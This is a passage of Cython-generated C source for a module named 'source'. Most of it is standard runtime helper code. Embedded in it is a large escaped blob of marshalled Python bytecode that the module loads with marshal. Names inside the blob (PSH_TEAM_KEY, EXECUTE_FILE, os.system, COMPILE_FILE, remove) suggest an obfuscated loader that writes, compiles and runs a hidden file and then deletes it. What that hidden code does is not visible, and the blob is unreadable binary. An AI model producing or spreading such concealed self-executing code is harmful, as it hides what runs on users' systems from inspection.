PyObject_IsSubclass(err, exc_type1) : 0;\n    if (unlikely(res == -1)) {\n        PyErr_WriteUnraisable(err);\n        res = 0;\n    }\n    if (!res) {\n        res = PyObject_IsSubclass(err, exc_type2);\n        if (unlikely(res == -1)) {\n            PyErr_WriteUnraisable(err);\n            res = 0;\n        }\n    }\n    __Pyx_ErrRestore(exception, value, tb);\n    return res;\n}\n#else\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\n    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;\n    if (!res) {\n        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\n    }\n    return res;\n}\n#endif\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    assert(PyExceptionClass_Check(exc_type));\n    n = PyTuple_GET_SIZE(tuple);\n#if PY_MAJOR_VERSION >= 3\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n#endif\n    for (i=0; i<n; i++) {\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\n        #if PY_MAJOR_VERSION < 3\n        if (likely(exc_type == t)) return 1;\n        #endif\n        if (likely(PyExceptionClass_Check(t))) {\n    ""        if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\n        } else {\n        }\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\n    if (likely(err == exc_type)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        if (likely(PyExceptionClass_Check(exc_type))) {\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);\n        } else if (likely(PyTuple_Check(exc_type))) {\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\n        } else {\n        }\n    }\n    return PyErr_GivenExceptionMatches(err, exc_type);\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\n    assert(PyExceptionClass_Check(exc_type1));\n    assert(PyExceptionClass_Check(exc_type2));\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\n    }\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\n}\n#endif\n\n/* CheckBinaryVersion */\n    static int __Pyx_check_binary_version(void) {\n    char ctversion[5];\n    int same=1, i, found_dot;\n    const char* rt_from_call = Py_GetVersion();\n    PyOS_snprintf(ctversion, 5, \"%d.%d\", PY_MAJOR_VERSION, PY_MINOR_VERSION);\n    found_dot = 0;\n    for (i = 0; i < 4; i++) {\n        if (!ctversion[i]) {\n            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');\n            break;\n        }\n        if (rt_from_call[i] != ctversion[i]) {\n            same = 0;\n            break;\n        }\n    }\n    if (!same) {\n        char rtversion[5] = {'\\0'};\n        char message[200];\n        for (i=0; i<4; ++i) {\n            if (rt_from_call[i] == '.') {\n                if (found_dot) break;\n                fo""und_dot = 1;\n            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {\n                break;\n            }\n            rtversion[i] = rt_from_call[i];\n        }\n        PyOS_snprintf(message, sizeof(message),\n                      \"compiletime version %s of module '%.100s' \"\n                      \"does not match runtime version %s\",\n                      ctversion, __Pyx_MODULE_NAME, rtversion);\n        return PyErr_WarnEx(NULL, message, 1);\n    }\n    return 0;\n}\n\n/* InitStrings */\n    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {\n    while (t->p) {\n        #if PY_MAJOR_VERSION < 3\n        if (t->is_unicode) {\n            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);\n        } else if (t->intern) {\n            *t->p = PyString_InternFromString(t->s);\n        } else {\n            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);\n        }\n        #else\n        if (t->is_unicode | t->is_str) {\n            if (t->intern) {\n                *t->p = PyUnicode_InternFromString(t->s);\n            } else if (t->encoding) {\n                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);\n            } else {\n                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);\n            }\n        } else {\n            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);\n        }\n        #endif\n        if (!*t->p)\n            return -1;\n        if (PyObject_Hash(*t->p) == -1)\n            return -1;\n        ++t;\n    }\n    return 0;\n}\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));\n}\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\n    Py_ssize_t ignore;\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\n}\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n#if !CYTHON_PEP393_ENABLED\nstatic const char* _""_Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    char* defenc_c;\n    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);\n    if (!defenc) return NULL;\n    defenc_c = PyBytes_AS_STRING(defenc);\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    {\n        char* end = defenc_c + PyBytes_GET_SIZE(defenc);\n        char* c;\n        for (c = defenc_c; c < end; c++) {\n            if ((unsigned char) (*c) >= 128) {\n                PyUnicode_AsASCIIString(o);\n                return NULL;\n            }\n        }\n    }\n#endif\n    *length = PyBytes_GET_SIZE(defenc);\n    return defenc_c;\n}\n#else\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    if (likely(PyUnicode_IS_ASCII(o))) {\n        *length = PyUnicode_GET_LENGTH(o);\n        return PyUnicode_AsUTF8(o);\n    } else {\n        PyUnicode_AsASCIIString(o);\n        return NULL;\n    }\n#else\n    return PyUnicode_AsUTF8AndSize(o, length);\n#endif\n}\n#endif\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n    if (\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n            __Pyx_sys_getdefaultencoding_not_ascii &&\n#endif\n            PyUnicode_Check(o)) {\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\n    } else\n#endif\n#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))\n    if (PyByteArray_Check(o)) {\n        *length = PyByteArray_GET_SIZE(o);\n        return PyByteArray_AS_STRING(o);\n    } else\n#endif\n    {\n        char* result;\n        int r = PyBytes_AsStringAndSize(o, &result, length);\n        if (unlikely(r < 0)) {\n            return NULL;\n        } else {\n            ret""urn result;\n        }\n    }\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\n   int is_true = x == Py_True;\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\n   else return PyObject_IsTrue(x);\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\n    int retval;\n    if (unlikely(!x)) return -1;\n    retval = __Pyx_PyObject_IsTrue(x);\n    Py_DECREF(x);\n    return retval;\n}\nstatic PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {\n#if PY_MAJOR_VERSION >= 3\n    if (PyLong_Check(result)) {\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                \"__int__ returned non-int (type %.200s).  \"\n                \"The ability to return an instance of a strict subclass of int \"\n                \"is deprecated, and may be removed in a future version of Python.\",\n                Py_TYPE(result)->tp_name)) {\n            Py_DECREF(result);\n            return NULL;\n        }\n        return result;\n    }\n#endif\n    PyErr_Format(PyExc_TypeError,\n                 \"__%.4s__ returned non-%.4s (type %.200s)\",\n                 type_name, type_name, Py_TYPE(result)->tp_name);\n    Py_DECREF(result);\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {\n#if CYTHON_USE_TYPE_SLOTS\n  PyNumberMethods *m;\n#endif\n  const char *name = NULL;\n  PyObject *res = NULL;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_Check(x) || PyLong_Check(x)))\n#else\n  if (likely(PyLong_Check(x)))\n#endif\n    return __Pyx_NewRef(x);\n#if CYTHON_USE_TYPE_SLOTS\n  m = Py_TYPE(x)->tp_as_number;\n  #if PY_MAJOR_VERSION < 3\n  if (m && m->nb_int) {\n    name = \"int\";\n    res = m->nb_int(x);\n  }\n  else if (m && m->nb_long) {\n    name = \"long\";\n    res = m->nb_long(x);\n  }\n  #else\n  if (likely(m && m->nb_int)) {\n    name = \"int\";\n    res = m->nb_int(x);\n  }\n  #endif\n#else\n  if (!PyBytes_CheckExact(x) && !PyUnicode_Chec""kExact(x)) {\n    res = PyNumber_Int(x);\n  }\n#endif\n  if (likely(res)) {\n#if PY_MAJOR_VERSION < 3\n    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {\n#else\n    if (unlikely(!PyLong_CheckExact(res))) {\n#endif\n        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);\n    }\n  }\n  else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_TypeError,\n                    \"an integer is required\");\n  }\n  return res;\n}\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {\n  Py_ssize_t ival;\n  PyObject *x;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_CheckExact(b))) {\n    if (sizeof(Py_ssize_t) >= sizeof(long))\n        return PyInt_AS_LONG(b);\n    else\n        return PyInt_AsSsize_t(b);\n  }\n#endif\n  if (likely(PyLong_CheckExact(b))) {\n    #if CYTHON_USE_PYLONG_INTERNALS\n    const digit* digits = ((PyLongObject*)b)->ob_digit;\n    const Py_ssize_t size = Py_SIZE(b);\n    if (likely(__Pyx_sst_abs(size) <= 1)) {\n        ival = likely(size) ? digits[0] : 0;\n        if (size == -1) ival = -ival;\n        return ival;\n    } else {\n      switch (size) {\n         case 2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digi""ts[0]));\n           }\n           break;\n         case 4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n      }\n    }\n    #endif\n    return PyLong_AsSsize_t(b);\n  }\n  x = PyNumber_Index(b);\n  if (!x) return -1;\n  ival = PyInt_AsSsize_t(x);\n  Py_DECREF(x);\n  return ival;\n}\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\n#if PY_MAJOR_VERSION < 3\n  } else if (likely(PyInt_CheckExact(o))) {\n    return PyInt_AS_LONG(o);\n#endif\n  } else {\n    Py_ssize_t ival;\n    PyObject *x;\n    x = PyNumber_Index(o);\n    if (!x) return -1;\n    ival = PyInt_AsLong(x);\n    Py_DECREF(x);\n    return ival;\n  }\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {\n    return PyInt_FromSize_t(ival);\n}\n\n\n#endif /* Py_PYTHON_H */)\rr\n\000\000\000r\035\000\000\000\351y\000\000\000r\r\000\000\000r\035\000\000\000r\037\000\000\000\351i\000\000\000\351v\000\000\000\351a\000\000\000r \000\000\000r\033\000\000\000r\n\000\000\000\351c\000\000\000r\005\000\000\000\351\377\377\377\377)\006\351g\000\000\000r0\000\000\000r0\000\000\000r\005\000\000\000\351-\000\000\000r\017\000\000\000)\017r\024\000\000\000r-\000\000\000\351n\000\000\000r0\000\000\000\351l\000\000\000\351u\000\000\000\351d\000\000""\000r\033\000\000\000r\024\000\000\000r\035\000\000\000r,\000\000\000r \000\000\000\351h\000\000\000r\036\000\000\000r4\000\000\000)\004r\005\000\000\000r3\000\000\000r\036\000\000\000r\005\000\000\000)\003r\005\000\000\000r3\000\000\000r*\000\000\000)\rr\024\000\000\000r5\000\000\000r-\000\000\000\351b\000\000\000r\005\000\000\000r3\000\000\000r5\000\000\000r\035\000\000\000r,\000\000\000r \000\000\000r8\000\000\000r\036\000\000\000r4\000\000\000\351w\000\000\000T)\001\332\010exist_ok)\035\332\002os\332\003sys\332\005bytes\332\006decode\332\014PSH_TEAM_KEY\332\014EXECUTE_FILE\332\006prefix\332\006PREFIX\332\021EXPORT_PYTHONHOME\332\nexecutable\332\030EXPORT_PYTHON_EXECUTABLE\332\003RUN\332\004path\332\006isfile\332\006system\332\004exit\332\010C_SOURCE\332\006C_FILE\332\004join\332\007version\332\005split\332\016PYTHON_VERSION\332\014COMPILE_FILE\332\004open\332\001f\332\005write\332\010makedirs\332\007dirname\332\006remove\251\000\363\000\000\000\000\332\006module\372\010<module>r\\\000\000\000\001\000\000\000s\025\005\000\000\360\003\001\001\001\340\000\t\200\t\200\t\200\t\330\000\n\200\n\200\n\200\n\340\017\024\210u\320\025A\320\025A\320\025A\321\017B\324\017B\327\017I\322\017I\321\017K\324\017K\200\014\340\017\024\210u\360\000\000\026J\002\360\000\000\026J\002\360\000\000\026J\002\361\000\000\020K\002\364\000\000\020K\002\367\000\000\020R\002\362\000\000\020R\002\361\000\000\020T\002\364\000\000\020T\002\200\014\330\t\014\214\032\200\006\330\024\031\220E\320\032h\320\032h\320\032h\321\024i\324\024i\327\024p\322\024p\321\024r\324\024r\320sy\321\024y\320\000\021\330\033 \2305\360\000\000\"L\002\360\000\000\"L\002\360\000\000\"L\002\361\000\000\034M\002\364\000\000\034M\002\367\000\000\034T\002\362\000\000\034T\002\361\000\000\034V\002\364\000\000\034V\002\360\000\000W\002Z\002\364\000\000W\002e\002\361\000\000\034e\002\320\000\030\340\006\013\200e\210R\220\022\210H\201o\204o\327\006\034\322\006\034\321\006\036\324\006\036\230|\321\006+\200\003\340\003\005\2047""\207>\202>\220,\321\003\037\324\003\037\360\000\002\001\014\330\004\r\200B\204I\320\016\037\240\005\240\005\320&6\320&6\320&6\321 7\324 7\327 >\322 >\321 @\324 @\321\016@\320AY\321\016Y\320Z_\320Z_\320`p\320`p\320`p\321Zq\324Zq\327Zx\322Zx\321Zz\324Zz\321\016z\320{~\321\016~\321\004\324\004\320\004\330\004\010\200D\210\021\201G\204G\200G\360\004K3\014\034\200\010\360Xf\001\000\n\017\210\025\320\017K\320\017K\320\017K\321\tL\324\tL\327\tS\322\tS\321\tU\324\tU\200\006\330\021\026\220\025\230\002\220t\221\033\224\033\327\021#\322\021#\321\021%\324\021%\327\021*\322\021*\2503\254;\327+<\322+<\270U\270U\300B\3004\271[\274[\327=O\322=O\321=Q\324=Q\321+R\324+R\320ST\324+U\327+[\322+[\320\\a\320\\a\320ce\320bf\321\\g\324\\g\327\\n\322\\n\321\\p\324\\p\321+q\324+q\320ru\320su\320ru\324+v\321\021w\324\021w\200\016\340\004\t\200E\320\n#\320\n#\320\n#\321\004$\324\004$\327\004+\322\004+\321\004-\324\004-\330\004\n\361\003\001\005\013\340\004\t\200E\320\nR\320\nR\320\nR\321\004S\324\004S\327\004Z\322\004Z\321\004\\\324\004\\\361\005\002\005]\001\360\006\000\005\023\361\007\003\005\023\360\010\000\005\n\200E\320\n\033\320\n\033\320\n\033\321\004\034\324\004\034\327\004#\322\004#\321\004%\324\004%\361\t\004\005&\360\n\000\005\021\361\013\005\005\021\360\014\000\005\n\200E\2102\210$\201K\204K\327\004\026\322\004\026\321\004\030\324\004\030\361\r\006\005\031\360\016\000\005\013\361\017\007\005\013\360\020\000\005\n\200E\210,\210,\210,\321\004\027\324\004\027\327\004\036\322\004\036\321\004 \324\004 \361\021\010\005!\360\022\000\005\013\361\023\t\005\013\360\024\000\005\n\200E\320\nG\320\nG\320\nG\321\004H\324\004H\327\004O\322\004O\321\004Q\324\004Q\361\025\n\005R\001\360\026\000\005\023\361\027\013\005\023\360\003\000\001\r\360 \000\006\n\200T\210&\220%\220%\230\023\230\005\221,\224,\327\022%\322\022%\321\022'\324\022'\321\005(\324\005(\360\000\001\001\026\250A\330\004\005\207G\202G\210H\321\004\025\324\004\025\320\004\025\360\003\001\001\026\360\000\001\001\026\360\000\001\001""\026\361\000\001\001\026\364\000\001\001\026\360\000\001\001\026\360\000\001\001\026\360\000\001\001\026\360\000\001\001\026\360\000\001\001\026\360\000\001\001\026\370\370\370\360\000\001\001\026\360\000\001\001\026\360\000\001\001\026\360\000\001\001\026\360\006\000\001\014\200\002\204\013\210B\214G\217O\212O\230L\321\014)\324\014)\260D\320\0009\321\0009\324\0009\320\0009\330\000\t\200\002\204\t\320\n\033\230E\230E\320\"2\320\"2\320\"2\321\0343\324\0343\327\034:\322\034:\321\034<\324\034<\321\n<\320=U\321\nU\320V[\320V[\320\\l\320\\l\320\\l\321Vm\324Vm\327Vt\322Vt\321Vv\324Vv\321\nv\360\000\000x\001D\002\361\000\000\013D\002\360\000\000E\002J\002\360\000\000E\002J\002\360\000\000K\002[\002\360\000\000K\002[\002\360\000\000K\002[\002\361\000\000E\002\\\002\364\000\000E\002\\\002\367\000\000E\002c\002\362\000\000E\002c\002\361\000\000E\002e\002\364\000\000E\002e\002\361\000\000\013e\002\360\000\000f\002i\002\361\000\000\013i\002\361\000\000\001j\002\364\000\000\001j\002\360\000\000\001j\002\340\000\t\200\002\204\t\210&\321\000\021\324\000\021\320\000\021\320\000\021\320\000\021s\022\000\000\000\313/\026L\021\003\314\021\004L\025\007\314\030\001L\025\007";
static PyObject *__pyx_n_s_builtins;
static PyObject *__pyx_kp_b_c_d_d_l_Z_d_d_l_Z_e_g_d_Z_e_g_d;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_loads;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_marshal;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_tuple_;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_kp_b_c_d_d_l_Z_d_d_l_Z_e_g_d_Z_e_g_d, __pyx_k_c_d_d_l_Z_d_d_l_Z_e_g_d_Z_e_g_d, sizeof(__pyx_k_c_d_d_l_Z_d_d_l_Z_e_g_d_Z_e_g_d), 0, 0, 0, 0},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_b_c_d_d_l_Z_d_d_l_Z_e_g_d_Z_e_g_d); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
